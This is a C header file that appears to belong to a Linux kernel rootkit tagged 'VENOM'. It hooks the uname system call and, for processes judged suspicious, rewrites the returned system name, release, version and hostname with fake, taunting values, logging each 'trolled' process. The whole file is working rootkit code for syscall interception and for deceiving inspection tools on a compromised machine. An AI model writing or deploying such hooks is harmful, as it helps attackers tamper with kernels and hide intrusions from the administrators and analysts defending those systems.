#ifndef UNAME_HACK_H
#define UNAME_HACK_H

#include "../include/headers.h"



static asmlinkage long (*orig_uname)(const struct pt_regs *regs);


notrace static asmlinkage long trev_uname(const struct pt_regs *regs) {
    struct new_utsname __user *name = (struct new_utsname __user *)regs->di;
    struct new_utsname fake_name;
    long ret;
    
    ret = orig_uname(regs);
    
    if (ret == 0 && is_suspicious_process()) {
        if (copy_from_user(&fake_name, name, sizeof(fake_name)) == 0) {
            strcpy(fake_name.sysname, "Catch-Me-If-U-Can");
            strcpy(fake_name.release, "Never-Gonna-Give-You-Up");
            strcpy(fake_name.version, "Linux-Is-Hacked");
            strcpy(fake_name.nodename, "localhost.localdomain");
            
            copy_to_user(name, &fake_name, sizeof(fake_name));
            TLOG_INF("[VENOM] Trolled: %s", current->comm);
        }
    }
    
    return ret;
}

#endif 

